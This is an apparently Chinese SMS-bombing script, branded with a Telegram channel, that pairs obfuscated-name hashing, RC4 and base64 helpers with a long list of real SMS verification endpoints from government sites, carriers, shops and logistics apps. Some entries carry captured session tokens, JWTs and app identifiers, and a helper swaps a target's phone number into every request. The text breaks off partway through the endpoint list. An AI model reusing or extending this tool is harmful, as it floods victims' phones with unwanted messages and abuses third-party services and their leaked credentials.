import requests
import json
import hashlib
import random
import uuid
import os
import time
import datetime
import struct


def get_device_id(file_path=".imei"):
    if os.path.exists(file_path):
        with open(file_path, "r") as f:
            device_id = f.read().strip()
    else:
        device_id = str(uuid.uuid1())
        with open(file_path, "w") as f:
            f.write(device_id)
    return device_id


def sha1_rotate_left(n, b):
    """循环左移"""
    return ((n << b) | (n >> (32 - b))) & 0xffffffff

def sha1_pad_message(message):
    """对消息进行填充"""
    if isinstance(message, str):
        message = message.encode('utf-8')
    
    length = len(message)
    message += b'\x80'
    message += b'\x00' * ((56 - (length + 1) % 64) % 64)
    message += struct.pack('>Q', length * 8)
    return message

def r77d51986dcf44955e359a8c19bf72837(message):
    """计算 SHA-1 哈希值"""
    # 初始化哈希值
    h0 = 0x67452301
    h1 = 0xEFCDAB89
    h2 = 0x98BADCFE
    h3 = 0x10325476
    h4 = 0xC3D2E1F0
    
    # 填充消息
    message = sha1_pad_message(message)
    
    # 处理消息块
    for i in range(0, len(message), 64):
        chunk = message[i:i+64]
        w = [0] * 80
        
        # 将块分解为16个32位字
        for j in range(16):
            w[j] = struct.unpack('>I', chunk[j*4:j*4+4])[0]
        
        # 扩展16个字为80个字
        for j in range(16, 80):
            w[j] = sha1_rotate_left(w[j-3] ^ w[j-8] ^ w[j-14] ^ w[j-16], 1)
        
        # 初始化工作变量
        a, b, c, d, e = h0, h1, h2, h3, h4
        
        # 主循环
        for j in range(80):
            if 0 <= j <= 19:
                f = (b & c) | ((~b) & d)
                k = 0x5A827999
            elif 20 <= j <= 39:
                f = b ^ c ^ d
                k = 0x6ED9EBA1
            elif 40 <= j <= 59:
                f = (b & c) | (b & d) | (c & d)
                k = 0x8F1BBCDC
            else:  # 60-79
                f = b ^ c ^ d
                k = 0xCA62C1D6
            
            temp = (sha1_rotate_left(a, 5) + f + e + k + w[j]) & 0xffffffff
            e = d
            d = c
            c = sha1_rotate_left(b, 30)
            b = a
            a = temp
        
        # 更新哈希值
        h0 = (h0 + a) & 0xffffffff
        h1 = (h1 + b) & 0xffffffff
        h2 = (h2 + c) & 0xffffffff
        h3 = (h3 + d) & 0xffffffff
        h4 = (h4 + e) & 0xffffffff
    
    # 生成最终哈希值
    return '%08x%08x%08x%08x%08x' % (h0, h1, h2, h3, h4)

# ==================== SHA-256 实现 ====================

def sha256_rotate_right(n, b):
    """循环右移"""
    return ((n >> b) | (n << (32 - b))) & 0xffffffff

def sha256_pad_message(message):
    """对消息进行填充"""
    if isinstance(message, str):
        message = message.encode('utf-8')
    
    length = len(message)
    message += b'\x80'
    message += b'\x00' * ((64 - (length + 9) % 64) % 64)
    message += struct.pack('>Q', length * 8)
    return message

def d8556af1cbf9e4f0e1068c38bd6fedb14(message):
    """计算 SHA-256 哈希值"""
    # 初始化哈希值（前8个质数的平方根的小数部分的前32位）
    h = [
        0x6a09e667, 0xbb67ae85, 0x3c6ef372, 0xa54ff53a,
        0x510e527f, 0x9b05688c, 0x1f83d9ab, 0x5be0cd19
    ]
    
    # 初始化常数（前64个质数的立方根的小数部分的前32位）
    k = [
        0x428a2f98, 0x71374491, 0xb5c0fbcf, 0xe9b5dba5, 0x3956c25b, 0x59f111f1, 0x923f82a4, 0xab1c5ed5,
        0xd807aa98, 0x12835b01, 0x243185be, 0x550c7dc3, 0x72be5d74, 0x80deb1fe, 0x9bdc06a7, 0xc19bf174,
        0xe49b69c1, 0xefbe4786, 0x0fc19dc6, 0x240ca1cc, 0x2de92c6f, 0x4a7484aa, 0x5cb0a9dc, 0x76f988da,
        0x983e5152, 0xa831c66d, 0xb00327c8, 0xbf597fc7, 0xc6e00bf3, 0xd5a79147, 0x06ca6351, 0x14292967,
        0x27b70a85, 0x2e1b2138, 0x4d2c6dfc, 0x53380d13, 0x650a7354, 0x766a0abb, 0x81c2c92e, 0x92722c85,
        0xa2bfe8a1, 0xa81a664b, 0xc24b8b70, 0xc76c51a3, 0xd192e819, 0xd6990624, 0xf40e3585, 0x106aa070,
        0x19a4c116, 0x1e376c08, 0x2748774c, 0x34b0bcb5, 0x391c0cb3, 0x4ed8aa4a, 0x5b9cca4f, 0x682e6ff3,
        0x748f82ee, 0x78a5636f, 0x84c87814, 0x8cc70208, 0x90befffa, 0xa4506ceb, 0xbef9a3f7, 0xc67178f2
    ]
    
    # 填充消息
    message = sha256_pad_message(message)
    
    # 处理消息块
    for i in range(0, len(message), 64):
        chunk = message[i:i+64]
        w = [0] * 64
        
        # 将块分解为16个32位字
        for j in range(16):
            w[j] = struct.unpack('>I', chunk[j*4:j*4+4])[0]
        
        # 扩展16个字为64个字
        for j in range(16, 64):
            s0 = sha256_rotate_right(w[j-15], 7) ^ sha256_rotate_right(w[j-15], 18) ^ (w[j-15] >> 3)
            s1 = sha256_rotate_right(w[j-2], 17) ^ sha256_rotate_right(w[j-2], 19) ^ (w[j-2] >> 10)
            w[j] = (w[j-16] + s0 + w[j-7] + s1) & 0xffffffff
        
        # 初始化工作变量
        a, b, c, d, e, f, g, h_temp = h
        
        # 主循环
        for j in range(64):
            S1 = sha256_rotate_right(e, 6) ^ sha256_rotate_right(e, 11) ^ sha256_rotate_right(e, 25)
            ch = (e & f) ^ ((~e) & g)
            temp1 = (h_temp + S1 + ch + k[j] + w[j]) & 0xffffffff
            S0 = sha256_rotate_right(a, 2) ^ sha256_rotate_right(a, 13) ^ sha256_rotate_right(a, 22)
            maj = (a & b) ^ (a & c) ^ (b & c)
            temp2 = (S0 + maj) & 0xffffffff
            
            h_temp = g
            g = f
            f = e
            e = (d + temp1) & 0xffffffff
            d = c
            c = b
            b = a
            a = (temp1 + temp2) & 0xffffffff
        
        # 更新哈希值
        h[0] = (h[0] + a) & 0xffffffff
        h[1] = (h[1] + b) & 0xffffffff
        h[2] = (h[2] + c) & 0xffffffff
        h[3] = (h[3] + d) & 0xffffffff
        h[4] = (h[4] + e) & 0xffffffff
        h[5] = (h[5] + f) & 0xffffffff
        h[6] = (h[6] + g) & 0xffffffff
        h[7] = (h[7] + h_temp) & 0xffffffff
    
    # 生成最终哈希值
    return ''.join(format(x, '08x') for x in h)

def oba392eaed8208d36ddbeb7fe66fd5637(data: str) -> str:
    m = hashlib.md5()
    m.update(data.encode('utf-8'))
    return m.hexdigest()

def l9871472f620c6f46c93728e92d1349a9(data, key):
    def ksa(key):
        key_len = len(key)
        schedule = list(range(256))
        j = 0
        for i in range(256):
            j = (j + schedule[i] + key[i % key_len]) % 256
            schedule[i], schedule[j] = schedule[j], schedule[i]
        return schedule

    def prga(schedule, data_len):
        i = j = 0
        stream = []
        for _ in range(data_len):
            i = (i + 1) % 256
            j = (j + schedule[i]) % 256
            schedule[i], schedule[j] = schedule[j], schedule[i]
            stream.append(schedule[(schedule[i] + schedule[j]) % 256])
        return stream

    def process(data, key):
        schedule = ksa(key)
        stream = prga(schedule, len(data))
        return bytes([d ^ s for d, s in zip(data, stream)])
    if isinstance(key, str):
        key = key.encode('utf-8')
    if isinstance(data, str):
        data = data.encode('utf-8')
    return process(data, key).decode('utf-8')
    
def r7589ac6513307d1fa97b2b8a73755751(data, key):
    def ksa(key):
        key_len = len(key)
        schedule = list(range(256))
        j = 0
        for i in range(256):
            j = (j + schedule[i] + key[i % key_len]) % 256
            schedule[i], schedule[j] = schedule[j], schedule[i]
        return schedule

    def prga(schedule, data_len):
        i = j = 0
        stream = []
        for _ in range(data_len):
            i = (i + 1) % 256
            j = (j + schedule[i]) % 256
            schedule[i], schedule[j] = schedule[j], schedule[i]
            stream.append(schedule[(schedule[i] + schedule[j]) % 256])
        return stream

    def process(data, key):
        schedule = ksa(key)
        stream = prga(schedule, len(data))
        return bytes([d ^ s for d, s in zip(data, stream)])
    if isinstance(key, str):
        key = key.encode('utf-8')
    if isinstance(data, str):
        data = data.encode('utf-8')
    return process(data, key)

def i7c6fb3134c356bf9fbdd691a378d51dc(data):
    if isinstance(data, str):
        data = data.encode('utf-8')
    elif not isinstance(data, bytes):
        raise ValueError("Input must be of type str or bytes")
    return ''.join(f'{byte:02x}' for byte in data)

def d5fd39c2a334d0204425bf97bbcb28876(hex_str):
    return bytes.fromhex(hex_str)

def y7d70291d2190fbf7b67ecb87e278aa4e(data: str) -> str:
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    byte_data = data.encode('utf-8')
    binary_data = ''.join(f'{byte:08b}' for byte in byte_data)
    base64_str = ""
    for i in range(0, len(binary_data), 6):
        chunk = binary_data[i:i+6]
        chunk = chunk.ljust(6, '0')
        index = int(chunk, 2)
        base64_str += base64_chars[index]
    while len(base64_str) % 4 != 0:
        base64_str += '='

    return base64_str

def j33fc4a568bf04579668abcde95784917(data: str) -> str:
    base64_chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    binary_data = ""
    data = data.rstrip('=')

    for c in data:
        index = base64_chars.index(c)
        binary_data += f'{index:06b}'
    byte_array = bytearray()
    for i in range(0, len(binary_data), 8):
        byte = binary_data[i:i+8]
        if len(byte) == 8:
            byte_array.append(int(byte, 2))
    return byte_array.decode('utf-8')

def r5be224d49f6cdd36b448a304e14ca7ac(data: str, base64_chars: str) -> str:
    byte_data = data.encode('utf-8')
    binary_data = ''.join(f'{byte:08b}' for byte in byte_data)
    base64_str = ""
    for i in range(0, len(binary_data), 6):
        chunk = binary_data[i:i+6]
        chunk = chunk.ljust(6, '0')
        index = int(chunk, 2)
        base64_str += base64_chars[index]
    while len(base64_str) % 4 != 0:
        base64_str += '='

    return base64_str

# 打字机效果 + 彩色LOGO（复制即运行）
import time

# 颜色配置
BLUE = '\033[34m'    # LOGO蓝色
GREEN = '\033[32m'   # 文字绿色
CYAN = '\033[36m'    # 分隔线青色
RESET = '\033[0m'    # 重置颜色

# 要打印的内容（按行拆分）
content = [
    (CYAN, "-------------------------------------------------"),
    (BLUE, " ____  ____      _ _ _ _"),
    (BLUE, " \\ \\   / /     / _ _ _  |"),
    (BLUE, "  \\     /     |  |   ____"),
    (BLUE, "  /     \\     |  |___|   |"),
    (BLUE, "/_/   \\_\\     \\_ _ _ _ | "),
    (GREEN, " 小硕短信轰炸版本"),
    (GREEN, " 小硕官方"),
    (GREEN, " 小硕短信轰炸官方频道:@gsxh91"),
    (CYAN, "-------------------------------------------------"),
    (GREEN, "官方频道:@gsxh91"),
    (GREEN, "永久公益"),
    (GREEN, "作者:小硕")
]

# 打字机核心逻辑（逐字打印，每行打完换行）
for color, line in content:
    for char in line:
        print(f"{color}{char}{RESET}", end='', flush=True)  # 不换行+强制刷新
        time.sleep(0.05)  # 打字速度（越小越快，0.05=中等速度）
    print()  # 每行结束换行
    time.sleep(0.2)  # 行与行之间的间隔

import requests
import time
import random
import json
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------- 进度条与颜色依赖 ----------
try:
    from tqdm import tqdm
except ImportError:
    import subprocess
    subprocess.check_call(['pip', 'install', 'tqdm'])
    from tqdm import tqdm

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except ImportError:
    import subprocess
    subprocess.check_call(['pip', 'install', 'colorama'])
    from colorama import init, Fore, Style
    init(autoreset=True)

print(Fore.CYAN + "官方频道:@@gsxh91" + Style.RESET_ALL)

# ---------- 辅助函数 ----------
def generate_random_user_agent():
    """随机生成 User-Agent"""
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    ]
    return random.choice(ua_list)

def replace_phone(obj, phone):
    """递归替换字符串/字典/列表中的手机号占位符及 __TIMESTAMP__"""
    placeholders = [
        '13800000000', '15915637092', '15915637093', '15915637098',
        '13800000002', '13856312354', '13000000000', '13800138000',
        '18888888888'
    ]
    if isinstance(obj, dict):
        new = {}
        for k, v in obj.items():
            new_k = replace_phone(k, phone)
            new_v = replace_phone(v, phone)
            new[new_k] = new_v
        return new
    elif isinstance(obj, list):
        return [replace_phone(i, phone) for i in obj]
    elif isinstance(obj, str):
        for p in placeholders:
            if p in obj:
                obj = obj.replace(p, phone)
        if '__TIMESTAMP__' in obj:
            obj = obj.replace('__TIMESTAMP__', str(int(time.time())))
        return obj
    else:
        return obj

# ---------- 接口配置列表 ----------
api_configs = []

# ========== 原有短信接口 ==========
api_configs.append({
    "method": "POST",
    "url": "https://glm.glodon.com/glm/worker-app-aggregator/gjg/account/message/code",
    "headers": {
        "Host": "glm.glodon.com",
        "content-type": "application/json",
        "xweb_xhr": "1",
        "user-agent": "__UA__",
        "accept": "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://servicewechat.com/wxb25232612195a5a8/92/page-frame.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "priority": "u=1, 1"
    },
    "data": {"mobile": "13800000000", "platform": 4, "type": 2}
})

api_configs.append({
    "method": "GET",
    "url": "https://shop.gdzlw.cn/api/app/member/getWxMiniAppLoginSmsCode?phone=13800000000",
    "headers": {"User-Agent": "__UA__"}
})

api_configs.append({
    "method": "GET",
    "url": "https://aqkhfz.yjglt.gxzf.gov.cn:1888/api//tbl_temuserinfo/temuserinfo/SMSCode?phone=13800000000",
    "headers": {"User-Agent": "__UA__"}
})

api_configs.append({
    "method": "GET",
    "url": "https://www.1958xy.com/app/v2/user/getLoginCode?phone=13800000000",
    "headers": {"User-Agent": "__UA__"}
})

api_configs.append({
    "method": "POST",
    "url": "https://uc.huan.tv/mobile/mobile/sendMobileVerifycode?f=5",
    "headers": {
        "Host": "uc.huan.tv",
        "accept": "*/*",
        "x-requested-with": "XMLHttpRequest",
        "user-agent": "__UA__",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "origin": "https://uc.huan.tv",
        "sec-fetch-site": "same-origin",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://uc.huan.tv/mobile/mobile/msgcodelogin?dnum=&didtoken=&src=&flag=true&tvlicense=UC&sn=&version=&t=&brand=tcl&clienttype=&returnurl=%2Fpages%2Fmy%2Findex&appid=LNJC&shieldLoginType=1&returntype=2&bindMobile=&loginInput=&md5pwd=&mobile=",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cookie": "SERVERERID=6d28be6acaa1f480f39f39ed02b5f234|1773578277|1773578263",
        "priority": "u=1, 1"
    },
    "data": "dnum=&didtoken=&src=&clienttype=&appid=LNJC&activityId=login_code&tvlicense=UC&flag=true&sn=&version=&t=&brand=tcl&returnurl=%2Fpages%2Fmy%2Findex&shieldLoginType=1&returntype=2&bindMobile=&mobile=13800000000&verifycode=&dnum="
})

api_configs.append({
    "method": "POST",
    "url": "https://www.ky.live/api/kylive/getsms",
    "headers": {
        "Host": "www.ky.live",
        "Connection": "keep-alive",
        "xweb_xhr": "1",
        "user-agent": "__UA__",
        "content-type": "application/json",
        "accept": "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://servicewechat.com/wx797e817e1b24a1d1/42/page-frame.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9"
    },
    "data": {"phone": "13800000000"}
})

api_configs.append({
    "method": "POST",
    "url": "https://usercenter.i4.cn/pcuserv3_sendSms.action",
    "headers": {
        "Host": "usercenter.i4.cn",
        "Connection": "keep-alive",
        "xweb_xhr": "1",
        "user-agent": "__UA__",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "accept": "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://servicewechat.com/wx46351c28a9201ccd/51/page-frame.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9"
    },
    "data": "member.phone=13800000000&member.appId=&platform=7"
})

api_configs.append({
    "method": "GET",
    "url": "http://www.tanwan.com/api/reg_json_2019.php?act=3&phone=13800000000&callback=jQuery112003247368730630804_1643269992344&_=__TIMESTAMP__",
    "headers": {"User-Agent": "__UA__"}
})

api_configs.append({
    "method": "POST",
    "url": "https://gdccdz.jmbg.com.cn:1443/charging/end_user/get_phone_message",
    "headers": {
        "Host": "gdccdz.jmbg.com.cn:1443",
        "Connection": "keep-alive",
        "xweb_xhr": "1",
        "loginType": "WECHAT",
        "user-agent": "__UA__",
        "content-type": "application/x-www-form-urlencoded",
        "accept": "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://servicewechat.com/wx84a8d1a2e6b14e8f/2/page-frame.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9"
    },
    "data": "phoneNumber=13800000000&smsType=LOGIN_CONFIRN"
})

api_configs.append({
    "method": "POST",
    "url": "https://app.xjylbz.cn/hsa-pss-appservice/app/forward/acct/appSendRegSms",
    "headers": {
        "Host": "app.xjylbz.cn",
        "Connection": "keep-alive",
        "accessToken": "",
        "xweb_xhr": "1",
        "channel": "wechat",
        "user-agent": "__UA__",
        "content-type": "application/json",
        "accept": "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://servicewechat.com/wx1e2d9faa8c564832/68/page-frame.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9"
    },
    "data": {"mobile": "13800000000"}
})

api_configs.append({
    "method": "GET",
    "url": "https://shjz.mzt.xinjiang.gov.cn/mzjz-py-external-plugin/login_by_qrcode/get_mobile_code?phone=13800000000",
    "headers": {"User-Agent": "__UA__"}
})

api_configs.append({
    "method": "POST",
    "url": "https://wap.xj.10086.cn/quanyi/wechatLogin/getVcode",
    "headers": {
        "Host": "wap.xj.10086.cn",
        "Connection": "keep-alive",
        "xweb_xhr": "1",
        "user-agent": "__UA__",
        "content-type": "application/json",
        "accept": "*/*",
        "sec-fetch-site": "cross-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://servicewechat.com/wx0f888fdd708a94de/68/page-frame.html",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9"
    },
    "data": {"mobile": "13800000000"}
})

# 接口2
api_configs.append({
    "method": "POST",
    "url": "https://yakeyun.ddsp.go2click.cn/mini/ortho/his/reg/smsApply",
    "headers": {
        "Host": "yakeyun.ddsp.go2click.cn", "Connection": "keep-alive", "charset": "utf-8",
        "appletcode": "mlk", "applethid": "", "User-Agent": "__UA__",
        "content-type": "application/json", "logintoken": "24338847b5e0b7f61973a007d7c35a68",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx7e0a5d8de86658d5/176/page-frame.html"
    },
    "data": '{"phone":"13800000000","clientCode":"yky2020"}'
})

# 接口3
api_configs.append({
    "method": "POST",
    "url": "https://ss.duya147.com/zba/api/sms",
    "headers": {
        "Host": "ss.duya147.com", "Connection": "keep-alive", "sec-ch-ua-platform": "\"Android\"",
        "User-Agent": "__UA__", "Accept": "application/json, text/plain, */*",
        "sec-ch-ua": "\"Not)A;Brand\";v=\"8\", \"Chromium\";v=\"138\", \"Android WebView\";v=\"138\"",
        "Content-Type": "application/json;charset=UTF-8", "sec-ch-ua-mobile": "?1",
        "Origin": "https://ss.duya147.com", "X-Requested-With": "com.tencent.mobileqq",
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://ss.duya147.com/abz147/register",
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7"
    },
    "data": '{"mobile":"13800000000","flag":1}'
})

# 接口4
api_configs.append({
    "method": "POST",
    "url": "https://api.yahedso.com/notification/codes/login",
    "headers": {
        "Host": "api.yahedso.com", "Connection": "keep-alive", "charset": "utf-8",
        "channel": "yahe-wechat-mini", "User-Agent": "__UA__", "content-type": "application/json",
        "sassappid": "0", "Accept-Encoding": "gzip,compress,br,deflate",
        "token": "eyJhbGciOiJIUzI1NiJ9.eyJsb2dpblRpbWUiOjE3NjU2MTMzMjA3MzAsImxvZ2luVHlwZSI6IldFQ0hBVCIsInVzZXJJZCI6MTk5OTc1MzMyNDA0MzE4MjA5MCwidXNlclNvdXJjZSI6IldFQ0hBVCJ9.eCKWy9UOKnLIj51wc-9oun8QhllP20lU9OT6z676inU",
        "Referer": "https://servicewechat.com/wx28364debdead316c/65/page-frame.html"
    },
    "data": '{"recv":"13800000000","verifyValue":"111111"}'
})

# 接口5
api_configs.append({
    "method": "POST",
    "url": "https://mp.dsssp.com/aw_api/v1/login/apiLoginAwService/sendSmsRegisterVerifyCode",
    "headers": {
        "Host": "mp.dsssp.com", "Connection": "keep-alive", "charset": "utf-8",
        "app-id": "wx10ad116a509bc468", "auth": "", "shop-id": "0",
        "sign": "338ED133CFFC3C0D330D6C3597B17FE1", "User-Agent": "__UA__",
        "open-id": "o1tuS5IFsqsYjnB_PQbMhuEjH3UQ", "union-id": "ozzMA65SxsPOwTcgv84bXktICFkk",
        "Accept-Encoding": "gzip,compress,br,deflate", "v": "1.0.14.34",
        "content-type": "application/json", "project-id": "2010156361", "store-puid": "82705",
        "ts": "__TIMESTAMP__",
        "Referer": "https://servicewechat.com/wx10ad116a509bc468/53/page-frame.html"
    },
    "data": '{"mobile":"13800000000","areaCode":""}'
})

# 接口6
api_configs.append({
    "method": "POST",
    "url": "https://m.aldi.com.cn/ouser-web/mobileRegister/sendCaptchasCodeForm.do",
    "headers": {
        "Host": "m.aldi.com.cn", "Connection": "keep-alive", "charset": "utf-8",
        "p-system": "weChat", "User-Agent": "__UA__",
        "content-type": "application/x-www-form-urlencoded;text/html;charset=utf-8",
        "Accept-Encoding": "gzip,compress,br,deflate", "cryptoversion": "621ed7c3d760780a3078f14f",
        "p-releasecode": "", "Referer": "https://servicewechat.com/wxcc73ef38a41c951a/373/page-frame.html"
    },
    "data": "mobile=13800000000&captchasType=3",
    "cookies": {"locale": "zh_CN", "ut": ""}
})

# 接口7
api_configs.append({
    "method": "GET",
    "url": "https://www.ycfwcx.com:12399/GetVcodeAction.do?act=reg&mobilePhone=13800000000",
    "headers": {
        "Host": "www.ycfwcx.com:12399", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "text/xml;charset=UTF-8",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx614f5d6294b6da99/41/page-frame.html"
    }
})

# 接口8
api_configs.append({
    "method": "POST",
    "url": "https://www.concare.cn/concare/tms/external/sendSms",
    "headers": {
        "Host": "www.concare.cn", "Connection": "keep-alive", "authorization": "", "charset": "utf-8",
        "operatoraccount": "", "destination": "192.168.201.129:8045", "User-Agent": "__UA__",
        "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate",
        "operatorname": "", "Referer": "https://servicewechat.com/wx37257d2a7be330e6/240/page-frame.html"
    },
    "data": '{"phone":"13800000000","type":2}'
})

# 接口11
api_configs.append({
    "method": "GET",
    "url": "https://fms.zmd.com.cn/industry/api/applet/driver/getSmsRandomCode?phone=13800000000&loginType=1",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口12
api_configs.append({
    "method": "GET",
    "url": "https://proyiyunliapi.eyunli.com/api/sms/login?phoneNumber=13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口13
api_configs.append({
    "method": "POST",
    "url": "https://scenter.gaojin.com.cn/api/gateway/api/identity/v3/verify-code",
    "headers": {
        "Host": "scenter.gaojin.com.cn", "Connection": "keep-alive", "charset": "utf-8",
        "application-key": "6ad56a704a744a5980f7d8597be59378", "User-Agent": "__UA__",
        "content-type": "application/json", "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx8b03134380c41f67/27/page-frame.html"
    },
    "data": '{"type":1,"target":"13800000000","checkAccount":true}'
})

# 接口14
api_configs.append({
    "method": "GET",
    "url": "https://tonghang.smartebao.com/oitTrade/applet/sms/sendLoginSms?phoneNo=13800000000",
    "headers": {
        "Host": "tonghang.smartebao.com", "Connection": "keep-alive", "charset": "utf-8",
        "mobile-request": "true", "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "token": "",
        "Referer": "https://servicewechat.com/wxcabd5caa3b36fe7d/82/page-frame.html"
    }
})

# 接口15
api_configs.append({
    "method": "POST",
    "url": "https://www.e-zhijian.com/wlhy168/sys/sms",
    "headers": {
        "Host": "www.e-zhijian.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate", "x-access-token": "",
        "Referer": "https://servicewechat.com/wx0165148df5d6b027/18/page-frame.html"
    },
    "data": '{"mobile":"13800000000","smsmode":1,"randomNumber":"","randomKey":"13800000000"}'
})

# 接口17
api_configs.append({
    "method": "POST",
    "url": "https://twebapi.chaojuntms.com/BaseManage/Home/SmsSend",
    "headers": {
        "Host": "twebapi.chaojuntms.com", "Connection": "keep-alive",
        "authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJVc2VySWQiOiJBZG1pbiIsIkV4cGlyZSI6IjIwMjAtMTItMDIgMgjvMzM6NTMuOTc5In0.q0p7t0UxzF8clSJudmSkwKO6fHzVCIae4EZ5cDnhYI0",
        "charset": "utf-8", "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxdcc8492fea52479c/23/page-frame.html"
    },
    "data": '{"Moblie":"13000000000","SmsCode":"","OpenId":""}'
})

# 接口18
api_configs.append({
    "method": "POST",
    "url": "https://api.cx.chinasinai.com/proxyapi/msg/sendMsg",
    "headers": {
        "Host": "api.cx.chinasinai.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate", "token": "",
        "Referer": "https://servicewechat.com/wx456af3c40ce2cb75/222/page-frame.html"
    },
    "data": "phone=13800000000"
})

# 接口19
api_configs.append({
    "method": "GET",
    "url": "https://napi.tudgo.com/logistics/driver/login/captcha?phone=13800000000",
    "headers": {
        "Host": "napi.tudgo.com", "Connection": "keep-alive", "authorization": "Bearer",
        "charset": "utf-8", "User-Agent": "__UA__", "content-type": "application/json",
        "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wxdb81eba0fb33f8e1/24/page-frame.html"
    }
})

# 接口20
api_configs.append({
    "method": "GET",
    "url": "https://gy.huajichen.com/tms/app/sms/sendAliCode?phone=13800000000",
    "headers": {"User-Agent": "__UA__", "Accept-Encoding": "gzip, deflate, br"}
})

# 接口22
api_configs.append({
    "method": "POST",
    "url": "https://api.ddduo.01tiaodong.cn/proxyapi/msg/sendMsg",
    "headers": {
        "Host": "api.ddduo.01tiaodong.cn", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "content-type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip,compress,br,deflate", "token": "",
        "Referer": "https://servicewechat.com/wx1d8ec8640fe8200e/282/page-frame.html"
    },
    "data": "phone=13800000000"
})

# 接口23
api_configs.append({
    "method": "POST",
    "url": "https://prod.java.56etms.com/xq-route-plan-tms/user/sendSmsCodeNoCheck",
    "headers": {
        "Host": "prod.java.56etms.com", "Connection": "keep-alive", "charset": "utf-8",
        "customer-type": "beta", "User-Agent": "__UA__",
        "content-type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip,compress,br,deflate",
        "Referer": "https://servicewechat.com/wx2323bae3a815876d/125/page-frame.html"
    },
    "data": "phone=13856312354"
})

# 接口24
api_configs.append({
    "method": "POST",
    "url": "https://yiliuyunshu.cn/wlhyapi/getSmsCode",
    "headers": {
        "Host": "yiliuyunshu.cn", "Connection": "keep-alive", "charset": "utf-8",
        "product": "app-wlhy-vhc", "ip": "111.38.169.240", "User-Agent": "__UA__",
        "imei": "ss-6149fa64-2902-4d25-b3f9-842ce6cae146",
        "content-type": "application/x-www-form-urlencoded", "Accept-Encoding": "gzip,compress,br,deflate",
        "osversion": "wechart-V2403A",
        "Referer": "https://servicewechat.com/wxff5f8ee7ca544929/15/page-frame.html"
    },
    "data": "mobile=13800000002&productKey=weapp-wlhy-vhc&session3rd=d6d813d7-e3a4-4052-acd5-3d79bb791350",
    "cookies": {"SHAREJSESSIONID": "ss-6149fa64-2902-4d25-b3f9-842ce6cae146"}
})

# 接口25
api_configs.append({
    "method": "POST",
    "url": "https://a.8m18.com/api/driver/login/verification_code",
    "headers": {
        "Host": "a.8m18.com", "Connection": "keep-alive", "charset": "utf-8",
        "User-Agent": "__UA__", "location": "", "content-type": "application/json",
